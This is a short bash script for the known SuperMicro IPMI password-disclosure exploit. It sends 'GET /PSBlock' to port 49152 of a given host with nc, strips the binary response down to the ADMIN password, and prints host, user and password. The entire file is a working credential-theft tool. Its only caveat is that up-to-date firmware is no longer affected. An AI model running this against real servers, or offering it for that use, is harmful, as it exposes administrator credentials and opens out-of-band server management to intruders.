#!/bin/bash
# Obtains output from 'nc $target 49152' of known SuperMicro IPMI exploit
# This exploit no longer works in up-to-date firmware installations. 

host="$1"

get_exp=$(nc $host 49152 << 'EOF'
GET /PSBlock
EOF
)

ipmi_pw=$(echo $get_exp |sed $'s/[^[:print:]\t]//g' |sed 's/ADMINm/;/g' |sed 's/TT/;/g' |cut -f2 -d ";" |head -n1)
echo "Host : http://$host/"
echo "User : ADMIN"
echo "Pass : $ipmi_pw"
